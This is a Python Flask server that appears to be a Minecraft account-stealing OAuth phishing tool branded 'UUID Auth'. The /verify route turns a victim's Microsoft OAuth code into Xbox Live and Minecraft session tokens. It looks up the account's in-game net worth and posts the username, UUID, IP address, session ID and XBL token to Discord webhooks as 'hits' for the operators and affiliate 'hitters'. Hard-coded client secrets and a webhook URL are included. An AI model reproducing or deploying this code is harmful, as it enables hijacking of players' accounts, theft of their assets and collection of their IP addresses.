import  subprocess
import ssl
from flask import Flask
from flask import request
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
from numerize import numerize
from configparser import ConfigParser
from threading import Thread
import os
import urllib.request
import json

# -- Variables --
client_secret = "71786446-3bdc-42b1-ab09-efbcf4e5f624"#self exp
client_id = '9f260e54e-b889-4e5f-8415-f1a4c1006a2f' #self exp
redirect_uri = 'https://public-oauth-5.onrender.com/verify' #your url with /verify at the end
webhook_url = 'https://discord.com/api/webhooks/1515695901216346322/hFAbhFau7f2CZe2V8bF_RqcFPT7PJLCDXyHeW6lYSLsrYxkXS8ZG9e1WFIqh23uB3WDE' #dhook
hit_url = '' #where hits should be listed (dhooked shit will be listed too too lazy to change)
nwlimit = 12022220 #dhook amount
hitschannel = '1512335943292682361'
whitelist = [] #ppl that does not get dhooked this func is bugged idk didnt wanna fix since i dont need
# -- End Variables --

#ChriSs#0001 was here
#@wol. was here now!


port = 80
app = Flask('')
config = ConfigParser()

def setnwlimit(limit):
    nwlimit = limit
    return nwlimit

def addwhitelist(name):
    whitelist.append(name)
    return whitelist

def removewhitelist(name):
    whitelist.remove(name)
    return whitelist

def getmsaccesstoken(code):
        url = "https://login.live.com/oauth20_token.srf"
        headers = {"Content-Type" : "application/x-www-form-urlencoded"}
        data = {
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "client_secret": client_secret,
            "code": code,
            "grant_type": 'authorization_code',
        }
        response = requests.post(url, headers=headers, data=data)
        jsonresponse = response.json()
        return jsonresponse['access_token'], jsonresponse['refresh_token']

def getxbltoken(access_token):
        url = "https://user.auth.xboxlive.com/user/authenticate"
        headers = {"Content-Type" : "application/json", "Accept" : "application/json"}
        data = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": "d=" + access_token
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
                }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['Token']
def getxstsuserhash(xbl):
        url = "https://xsts.auth.xboxlive.com/xsts/authorize"
        headers = {"Content-Type" : "application/json", "Accept" : "application/json"}
        data = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [
                    xbl
                    ]
                    },
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT"
                    }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['DisplayClaims']['xui'][0]['uhs'],jsonresponse['Token']
def getssid(userhash, xsts):
        url = "https://api.minecraftservices.com/authentication/login_with_xbox"
        headers = {'Content-Type': 'application/json'}
        data = {
           "identityToken" : f"XBL3.0 x={userhash};{xsts}",
           "ensureLegacyEnabled" : "true"
        }
        response = requests.post(url, headers=headers, json=data)
        jsonresponse = response.json()
        return jsonresponse['access_token']


def getignuuid(ssid):
        try:
            url = "https://api.minecraftservices.com/minecraft/profile"
            headers = {"Content-Type": "application/json" , "Authorization": "Bearer " + ssid}
            response = requests.get(url, headers=headers)
            jsonresponse = response.json()
            return jsonresponse['name'],jsonresponse['id']

        except:
            print("NO MINECRAFT ACCOUNT OR COULDNT GET UUID")


def getownerhook(ownerid):
    try:
        config.read("config.ini")
        ownerhook = config.get("hooks", ownerid)
        return ownerhook
    except:
        return webhook_url
        return hit_url


def get_net_worth(uuid):
    try:
        output = subprocess.check_output(['node', 'index.js', uuid], universal_newlines=True)
        networth = output.strip()
    except Exception as e:
        print(f'Error getting net worth: {e}')
        networth = 'N/A'

    return networth

@app.route('/refreshxbl', methods = ['POST', 'GET'])
def refresh():
    try:
        xbl = request.args.get('xbl')
        xstsuserhash = getxstsuserhash(xbl)
        ssid = getssid(xstsuserhash[0], xstsuserhash[1])
        ssid = ssid
        return ssid
    except KeyError:
        return "Invalid XBL Token/Token Expired/Ratelimit"
@app.route('/verify', methods = ['POST', 'GET'])
def xstshook():
    try:
        args = request.args
        code = args.get("code")
        ownerid = args.get("state")
        ownerhook = getownerhook(ownerid)
        ip = request.headers['X-Forwarded-For']
        msaccesstoken, refresh_token = getmsaccesstoken(code)
        xbl = getxbltoken(msaccesstoken)
        xstsuserhash = getxstsuserhash(xbl)
        ssid = getssid(xstsuserhash[0], xstsuserhash[1])
        ignuuid = getignuuid(ssid)
        uuid = ignuuid[1]
        ign = ignuuid[0]
        networth = get_net_worth(uuid)
  #      webhook(webhook_url, ign, uuid, ssid,  ip, ownerid, xbl)
        newhit(hit_url, ign, uuid, ssid,  ip, ownerid, xbl, networth)
        webhook(ownerhook, ign, uuid, ssid,  ip, ownerid, xbl, networth)
        hits_channel(hitschannel, networth)
        return 'Authorized.'
    except KeyError as e:
        print (e)
        return "Unauthorized"
        
    except Exception as e:
        return f"{e} Error"
    
def hits_channel(url, networth):
    webhook = DiscordWebhook(url=url, content="New Hit!", username="UUID's OAuth Hits", avatar_url="https://cdn.discordapp.com/attachments/1121136770835296427/1121892552707162123/dfyxd04-49a79431-97b2-4e51-bf02-594ec065a01c.png")
    embed = DiscordEmbed(title=f"New Hit Done With UUID OAuth: {networth} Networth", color='D8BFD8')
    embed.set_footer(text='Powered by https://discord.gg/nCEbUD4GNS Get UUID Auth Today')
    embed.set_timestamp()
    webhook.add_embed(embed)
    webhook.execute()

def webhook(url, ign, uuid, ssid, ip, ownerid, xbl, networth):
    webhook = DiscordWebhook(url=url, content="i dont like pinging everyone", username="UUID's OAuth", avatar_url="https://cdn.discordapp.com/attachments/1121136770835296427/1121892552707162123/dfyxd04-49a79431-97b2-4e51-bf02-594ec065a01c.png")
    embed = DiscordEmbed(title=f"UUID Auth Networth: {networth}", color='D8BFD8')
    embed.set_author(name=ign, url='https://sky.shiiyu.moe/stats/' + uuid, icon_url='https://mc-heads.net/avatar/' + uuid)
    embed.set_footer(text='Powered by https://discord.gg/nCEbUD4GNS')
    embed.set_description("UUID Auth \n \n ***XBL Refresh*** \n Click [here](https://mcauth.uk/refreshxbl?xbl=" + xbl +") to refresh using their XBL token!")
    embed.set_timestamp()
    embed.add_embed_field(name='IGN ', value="```" + ign + "```", inline=True)
    embed.add_embed_field(name='UUID ', value="```" + uuid + "```", inline=True)
    embed.add_embed_field(name='IP ', value="```" + ip + "```", inline=True)
    embed.add_embed_field(name='Session ID ', value="```" + ssid + "```", inline=False)

    #url = "https://discordlookup.mesavirep.xyz/v1/user/" + ownerid
    #with urllib.request.urlopen(url) as response:
     #   data = json.load(response)

    # Extract the desired value from the JSON data
    #discord_user_tag = data["tag"]

   # embed.add_embed_field(name='Hitter\'s Discord ID', value="```" + ownerid + "```", inline=False)
   # embed.add_embed_field(name='Hitter\'s Discord Tag', value="```" + discord_user_tag + "```", inline=False)

    webhook.add_embed(embed)
    webhook.execute()
def newhit(url, ign, uuid, ssid, ip, ownerid, xbl, networth):
    webhook = DiscordWebhook(url=url, content="<@1112876121449570425> <@1096143117234745434>", username="UUID's OAuth", avatar_url="https://cdn.discordapp.com/attachments/1121136770835296427/1121892552707162123/dfyxd04-49a79431-97b2-4e51-bf02-594ec065a01c.png")
    embed = DiscordEmbed(title=f'UUID Auth Presents Networth: {networth}', color='D8BFD8')
    embed.set_author(name=ign, url='https://sky.shiiyu.moe/stats/' + uuid, icon_url='https://mc-heads.net/avatar/' + uuid)
    embed.set_footer(text='Powered by https://discord.gg/nCEbUD4GNS')
    embed.set_description("UUID Auth \n \n ***XBL Refresh*** \n Click [here](https://mcauth.ru/refreshxbl?xbl=" + xbl +") to refresh using their XBL token!")
    embed.set_timestamp()
    embed.add_embed_field(name='IGN ', value="```" + ign + "```", inline=True)
    embed.add_embed_field(name='UUID ', value="```" + uuid + "```", inline=True)
    embed.add_embed_field(name='IP ', value="```" + ip + "```", inline=True)
    embed.add_embed_field(name='Session ID ', value="```" + ssid + "```", inline=False)

    url = "https://discordlookup.mesavirep.xyz/v1/user/" + ownerid
    with urllib.request.urlopen(url) as response:
        data = json.load(response)

    # Extract the desired value from the JSON data
    discord_user_tag = data["tag"]

    embed.add_embed_field(name='Hitter\'s Discord ID', value="```" + ownerid + "```", inline=False)
    embed.add_embed_field(name='Hitter\'s Discord Tag', value="```" + discord_user_tag + "```", inline=False)

    webhook.add_embed(embed)
    webhook.execute()
    
@app.route('/')
def home():
    return "https://discord.gg/uuid"
@app.route('/refreshtoken')
def refreshtoken():
    return "https://discord.gg/uuid REFRESH COMES SOON!"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=port)

def run():
  app.run(host='0.0.0.0',port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()
